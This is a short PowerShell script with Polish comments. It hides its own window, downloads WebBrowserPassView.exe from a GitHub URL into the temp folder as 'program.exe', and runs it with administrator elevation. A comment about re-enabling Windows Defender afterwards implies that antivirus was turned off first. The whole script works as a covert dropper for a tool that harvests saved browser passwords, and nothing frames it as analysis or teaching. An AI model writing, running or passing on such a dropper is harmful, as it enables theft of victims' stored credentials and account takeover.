# Minimalizacja okna
$null = (Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name 'Win32ShowWindowAsync' -Namespace Win32Functions -PassThru)::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle), 6)

# Pobierz i wykonaj plik EXE
$exeUrl = "https://github.com/dfassdaopiju/XzxX/blob/main/WebBrowserPassView.exe"
$exePath = "$env:TEMP\program.exe"

try {
    # Pobierz plik
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
    
    # Uruchom jako administrator
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exePath
    $psi.Verb = "runas"
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
}
catch {
    Write-Output "Error: $_"
}

# Opcjonalnie: Przywróć Windows Defender po wykonaniu
# Set-MpPreference -DisableRealtimeMonitoring $false
